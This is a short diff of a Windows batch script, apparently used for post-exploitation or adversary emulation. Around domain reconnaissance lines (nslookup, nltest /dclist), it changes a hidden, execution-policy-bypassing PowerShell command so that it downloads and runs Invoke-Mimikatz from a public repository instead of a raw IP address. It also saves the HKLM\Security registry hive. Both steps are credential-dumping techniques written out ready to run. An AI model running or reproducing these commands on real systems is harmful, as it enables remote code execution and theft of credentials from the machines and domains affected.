@@ -364,7 +364,7 @@ nslookup whatismyip.com
 ECHO ============================
 nltest /dclist:abc.local
 ECHO ============================
-cmd.exe /c powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
+cmd.exe /c powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
 ECHO ============================
 reg save HKLM\Security security.hive
 ECHO ============================
